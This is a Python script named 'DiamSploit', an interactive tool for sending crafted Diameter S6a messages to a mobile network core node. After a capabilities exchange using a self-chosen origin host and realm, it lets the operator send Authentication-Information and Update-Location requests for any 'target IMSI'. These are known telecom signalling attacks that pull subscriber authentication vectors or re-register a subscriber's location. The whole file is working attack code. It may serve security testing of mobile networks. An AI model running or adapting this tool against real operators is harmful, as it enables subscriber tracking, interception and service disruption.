#!/usr/bin/env python

import diameter
import diameter.common_messages as cm
import diameter.S6a_3GPP as s6a
import socket

from colorama import Fore, Style
from pyfiglet import figlet_format
from dotenv import load_dotenv
from pathlib import Path
import os

# .env file path
ENV_FILE = Path(__file__).parent.parent / ".env"

def send_authentication_info(destination_host, destination_realm, imsi, visited_plmn, s, buffer):
    air = s6a.AuthenticationInformationRequest(diameter.VERSION_ONE)
    air.session_id(origin_host + ";123456789".encode("ascii"))
    air.auth_session_state()
    air.origin_host(origin_host)
    air.origin_realm(origin_realm)
    air.destination_host(destination_host.encode("ascii"))
    air.destination_realm(destination_realm.encode("ascii"))
    air.user_name(imsi.encode("ascii"))
    air.requested_eutran_authentication_info(1, immediate=True, resync=(os.urandom(16), os.urandom(14)))
    air.visited_plmn_id(visited_plmn)
    air.build()
    print(Fore.YELLOW + "[*] Sending Authentication-Info Request (AIR) ..." + Style.RESET_ALL)
    s.send(air.get_msg())
    aia = diameter.DiameterResponse(s.recv(buffer))
    aia.process()
    if aia.success():
        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (AIA)" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[+] DIAMETER_FAILURE (AIA)" + Style.RESET_ALL)

def send_update_location(destination_realm, imsi, visited_plmn, s, buffer):
    ulr = s6a.UpdateLocationRequest(diameter.VERSION_ONE)
    ulr.session_id(origin_host + ";123456789".encode("ascii"))
    ulr.origin_host(origin_host)
    ulr.origin_realm(origin_realm)
    ulr.destination_realm(destination_realm.encode("ascii"))
    ulr.user_name(imsi.encode("ascii"))
    ulr.rat_type(1004)
    flags = 0
    flags |= (1 << 5)
    flags |= (1 << 4)
    ulr.ulr_flags(flags)
    ulr.visited_plmn_id(visited_plmn)
    ulr.build()
    print(Fore.YELLOW + "[*] Sending Update-Location Request (ULR) ..." + Style.RESET_ALL)
    s.send(ulr.get_msg())
    ula = diameter.DiameterResponse(s.recv(buffer))
    ula.process()
    if ula.success():
        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (ULA)" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[+] DIAMETER_FAILURE (ULA)" + Style.RESET_ALL)

def send_capabilities_exchange(cer, s, buffer):
    print(Fore.YELLOW + "[*] Sending Capabilities-Exchange Request (CER) ..." + Style.RESET_ALL)
    s.send(cer.get_msg())
    cea = diameter.DiameterResponse(s.recv(buffer))
    cea.process()
    if cea.success():
        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (CEA)" + Style.RESET_ALL)
        print("[+] Origin-Host: " + Fore.RED + cea.avps[diameter.AVP_ORIGIN_HOST][0].data.decode("ascii") + Style.RESET_ALL)
        print("[+] Origin-Realm: " + Fore.RED + cea.avps[diameter.AVP_ORIGIN_REALM][0].data.decode("ascii") + Style.RESET_ALL)
    else:
        print(Fore.RED + "[+] DIAMETER_FAILURE (CEA)" + Style.RESET_ALL)

def send_device_watchdog(dwr, s, buffer):
    print(Fore.YELLOW + "[*] Sending Device-Watchdog Request (DWR) ..." + Style.RESET_ALL)
    s.send(dwr.get_msg())
    dwa = diameter.DiameterResponse(s.recv(buffer))
    dwa.process()
    if dwa.success():
        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (DWA)" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[+] DIAMETER_FAILURE (DWA)" + Style.RESET_ALL)

def send_disconnect_peer(dpr, s, buffer):
    print(Fore.YELLOW + "[*] Sending Disconnect-Peer Request (DPR) ..." + Style.RESET_ALL)
    s.send(dpr.get_msg())
    dpa = diameter.DiameterResponse(s.recv(buffer))
    dpa.process()
    if dpa.success():
        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (DPA)" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[+] DIAMETER_FAILURE (DPA)" + Style.RESET_ALL)

if __name__ == "__main__":
    
    title = figlet_format("DiamSploit")
    print(Fore.RED + title + Style.RESET_ALL)

    # Get params
    if ENV_FILE.exists():
        print(Fore.GREEN + "[+] Found .env file\n" + Style.RESET_ALL)
        load_dotenv(ENV_FILE)
        bind_ip = os.getenv("BIND_IP")
        host = os.getenv("HOST")
        port = int(os.getenv("PORT"))
        protocol = os.getenv("PROTOCOL")
        origin_host = os.getenv("ORIGIN_HOST")
        mcc = os.getenv("MCC")
        mnc = os.getenv("MNC")
        product_name = os.getenv("PRODUCT_NAME")
        buffer = int(os.getenv("BUFFER"))
    else:
        bind_ip = input("Enter source peer IP address > ")
        host = input("Enter destination peer IP address > ")
        port = int(input("Enter destination peer port (default 3868) > "))
        protocol = input("Enter transport protocol (TCP/SCTP) > ")
        origin_host = input("Enter your origin host > ")
        mcc = input("Enter your MCC code (3 digits) > ")
        mnc = input("Enter your MNC code (2 or 3 digits) > ")
        product_name = input("Enter your product name > ")
        buffer = 4096

    temp_mnc = mnc
    if len(temp_mnc) == 2:
        temp_mnc = "0" + mnc
    origin_host = origin_host.encode("ascii")
    origin_realm = f"epc.mnc{temp_mnc}.mcc{mcc}.3gppnetwork.org".encode("ascii")
    # origin_host = f"{origin_host}.".encode("ascii") + origin_realm  # FQDN
    product_name = product_name.encode("ascii")

    # Build standard requests
    print("\n[*] Initialize DIAMETER stack ...")
    cer = cm.CapabilitiesExchangeRequest(diameter.VERSION_ONE)
    cer.origin_host(origin_host)
    cer.origin_realm(origin_realm)
    cer.vendor_id(0)
    cer.product_name(product_name)
    cer.build()
    
    dwr = cm.DeviceWatchdogRequest(diameter.VERSION_ONE)
    dwr.origin_host(origin_host)
    dwr.origin_realm(origin_realm)
    dwr.build()

    dpr = cm.DisconnectPeerRequest(diameter.VERSION_ONE)
    dpr.origin_host(origin_host)
    dpr.origin_realm(origin_realm)
    dpr.disconnect_cause(cm.DISCONNECT_CAUSE_DO_NOT_WANT_TO_TALK_TO_YOU)
    dpr.build()

    # Server connection
    print("[*] Connecting to server ...")
    if protocol == "TCP":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    elif protocol == "SCTP":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_SCTP)
    else:
        exit("Invalid transport protocol")
    s.bind((bind_ip, 0))
    s.connect((host, port))
    print(Fore.GREEN + "[+] Connection established\n" + Style.RESET_ALL)
    s.getpeername()
    send_capabilities_exchange(cer, s, buffer)

    command = input("(" + Fore.RED + host + Style.RESET_ALL + ") > ")
    while command != "exit":
        if command == "dwr":
            send_device_watchdog(dwr, s, buffer)
        elif command == "air":
            destination_host = input("Enter destination host > ")
            destination_realm = input("Enter destination realm > ")
            imsi = input("Enter target IMSI > ")
            send_authentication_info(destination_host, destination_realm, imsi, (mcc, mnc), s, buffer)
        elif command == "ulr":
            destination_realm = input("Enter destination realm > ")
            imsi = input("Enter target IMSI > ")
            send_update_location(destination_realm, imsi, (mcc, mnc), s, buffer)
        command = input("(" + Fore.RED + host + Style.RESET_ALL + ") > ")

    send_disconnect_peer(dpr, s, buffer)
    s.close()
